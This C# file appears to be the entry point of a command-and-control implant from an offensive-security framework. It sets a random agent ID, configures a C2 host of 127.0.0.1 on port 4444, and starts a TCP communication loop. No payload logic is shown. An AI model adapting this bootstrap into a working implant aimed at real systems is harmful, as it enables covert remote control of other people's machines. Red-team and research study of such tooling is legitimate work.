using Agent.Models;
using Agent.Modules;
using Agent.Controllers;

namespace Agent
{
    class Agent
    {
        public Agent() { ExecuteAgent(); }

        static void Main(string[] args) { new Agent(); }

        public static void Execute() { new Agent(); }

        public void ExecuteAgent()
        {
            var agentId = Helpers.GenerateRandomString(8);
            var config = new ConfigController();
            config.SetOption(ConfigurationSettings.AgentId, agentId);
            config.SetOption(ConfigurationSettings.C2Host, "127.0.0.1");
            config.SetOption(ConfigurationSettings.C2Port, 4444);

            var comm = new TCPCommModule();
            comm.Initialise(config);

            var agent = new AgentController(config, comm);
            agent.AddAgentModule(new TCPModule());
            agent.Run();
        }
    }
}